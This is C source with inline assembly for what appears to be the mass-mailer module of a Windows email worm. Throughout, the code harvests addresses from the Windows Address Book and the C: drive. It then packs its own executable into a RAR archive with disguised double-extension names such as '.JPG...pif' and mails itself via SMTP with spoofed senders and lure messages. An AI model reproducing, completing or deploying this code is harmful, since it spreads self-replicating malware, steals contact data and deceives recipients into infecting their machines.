   #include "stdafx.h"
   #include "prototypez.h"
   #include "stdlib.h"
   #include "winsock2.h"
   #include "smtp_engine.h"

   /*mass mailer module */


   #define MAX_MAILS       0x50
   #define MAX_MAIL_SIZE   0x44

   char    WAB[MAX_MAILS][MAX_MAIL_SIZE];      //windows address book mailist
   short   nWABMails=0;

   char *subjects[]={"Re","Resume","Your Files","Your Stuff","My Story"};

   char *messages[]={"here are the pictures you asked me to send you.",
                     "please read again what i have written to you !",
                     "here are the programms you asked me to mail you\nfor any help,mail me back",
                      "here are the porn screen saver you asked me to show you...",
                       "just read it,its fantastic"};

   char *attachments[]={"pictures.rar","info.rar","package1.rar","porn.rar","My Life.rar"};

   char *xAttachments[]={"pictures.JPG...pif","mail_READ.txt...scr",
                         "musicbox.MP3.pif","linda.scr","Story.scr"};

   const int N_Attch=5;

   int  nmsg=0;

   #define MAX_MESSAGES 5


   BOOL GetWABMails()
   {
       HKEY hkey;
       char WABFile[MAX_PATH];
       DWORD WF_size=sizeof(WABFile);
       DWORD WF_Type=REG_SZ;
       HANDLE hfile,hmap;
       LPVOID WABase;

       if(RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\WAB\\WAB4\\Wab File Name",
           0,KEY_READ,&hkey)==ERROR_SUCCESS)
       {
           RegQueryValueEx(hkey,"",0,&WF_Type,(BYTE *)WABFile,&WF_size);
           RegCloseKey(hkey);
       }
       else
           return FALSE;

       hfile=CreateFile(WABFile,GENERIC_READ,FILE_SHARE_READ,
           NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

       if(hfile==INVALID_HANDLE_VALUE)
           return FALSE;

       hmap=CreateFileMapping(hfile,NULL,PAGE_READONLY,NULL,NULL,NULL);

       if(hmap==0)
       {
           CloseHandle(hfile);
           return FALSE;
       }

       WABase=MapViewOfFile(hmap,FILE_MAP_READ,NULL,
           NULL,NULL);

       if(WABase==NULL)
       {
           CloseHandle(hmap);
           CloseHandle(hfile);
           return FALSE;
       }

       __asm
       {
           mov     eax,[WABase]
           push    word ptr [eax + 64h]
           pop     [nWABMails]                     ;get number of mails
       }

       if(nWABMails<=1)
       {
           UnmapViewOfFile(WABase);
           CloseHandle(hmap);
           CloseHandle(hfile);
           return FALSE;
       }

       if(nWABMails>MAX_MAILS)
           nWABMails=MAX_MAILS;


       __asm
       {
           mov     esi,[WABase]
           movzx   ecx,[nWABMails]
           add     esi,[esi + 60h]                     ;goto start of mails
           lea     edi,WAB
   NMail:  push    ecx                                 ;save number of mails
           xor     ebx,ebx
           mov     ecx,MAX_MAIL_SIZE
   NxtChar:lodsb                                       ;read one char
           inc     esi
           mov     byte ptr [edi + ebx],al             ;save it !
           cmp     byte ptr [esi],0h
           je      MNextMail
           inc     ebx
           dec     ecx
           loop    NxtChar
   MNextMail:
           sub     ecx,2h
           add     esi,ecx
           add     edi,MAX_MAIL_SIZE                   ;move to next field at the array
           pop     ecx
           loop    NMail                               ;move to next mail
       }

       UnmapViewOfFile(WABase);
       CloseHandle(hmap);
       CloseHandle(hfile);
       return TRUE;
   }

   DWORD WINAPI mailworm(LPVOID xvoid)
   {
       SOCKET smailworm;
       Mailist xMList;
       MailInfoList xMIL;
       int i=0;
       HGLOBAL wBase64=NULL;
       char xAttach[MAX_PATH];
       char WormPath[MAX_PATH];
       char rnd_str[7];
       int worm_s=0;

       xMList.max_mails_to_send=MAX_MAILS;     //set max of mails

       if(GetWABMails()==TRUE)
       {
           xMList.number_of_mails=nWABMails;

           for(i=0;i<nWABMails;i++)
               lstrcpy(xMList.mail_list[i],WAB[i]);        //copy wab mails into main list
       }

       InitMailSearch("c:\\");     //scan c drive for mails

       WaitForSingleObject(XThread(mail_search,&xMList),INFINITE);

       GetModuleFileName(NULL,WormPath,MAX_PATH);

       GetTempPath(MAX_PATH,xAttach);

       RandomString(rnd_str,sizeof(rnd_str),TRUE);

       lstrcat(xAttach,rnd_str);
       lstrcat(xAttach,".tmp");

       if(AddToRar(xAttach,WormPath,
           xAttachments[(rand() % N_Attch)],FILE_ATTRIBUTE_NORMAL)==TRUE)  //make rar archive
       {
           if(base64_worm_encode(xAttach,wBase64,worm_s)==TRUE) //base64 encode the worm
           {
               DeleteFile(xAttach);

               memset(&xMIL,0,sizeof(xMIL));   //zero struct

               for(i=0;i<MAX_MESSAGES;i++) //setup mail info list
               {
                   lstrcpy(xMIL.mail_info_list[i].attachment,attachments[i]);
                   lstrcpy(xMIL.mail_info_list[i].subject,subjects[i]);
                   lstrcpy(xMIL.mail_info_list[i].text,messages[i]);
               }

               xMIL.fake_mail_from=TRUE;   //pick random mail from the mail list
               xMIL.number_of_MIL=MAX_MESSAGES;

               smailworm=FindSmtp_AndConnect();    //connect to smtp server

               if(smailworm!=NULL)
                   SendMails(smailworm,xMList,(void *)wBase64,worm_s,xMIL);

               Base64_free_image(wBase64); //free base64 encoded worm memory
           }
       }

       return 1;
   }
